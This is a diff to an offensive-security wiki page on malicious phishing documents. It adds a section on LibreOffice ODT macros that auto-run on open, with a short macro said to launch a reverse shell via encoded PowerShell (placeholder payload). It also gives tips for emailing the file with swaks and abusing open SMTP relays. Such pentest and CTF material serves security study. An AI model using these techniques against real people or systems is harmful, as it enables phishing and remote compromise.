@@ -83,6 +83,23 @@ Do this because you **can't save macro's inside a `.docx`** and there's a **stig
   - [**macphish**](https://github.com/cldrn/macphish)
   - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
+## LibreOffice ODT auto-run macros (Basic)
+
+LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
+
+```vb
+Sub Shell
+    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
+End Sub
+```
+
+Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.
+
+Delivery tips:
+
+- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.
+- When emailing with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.
+
 ## HTA Files
 
 An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
@@ -293,6 +310,7 @@ Check the page about **places to steal NTLM creds**:
 
 ## References
 
+- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
 - [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
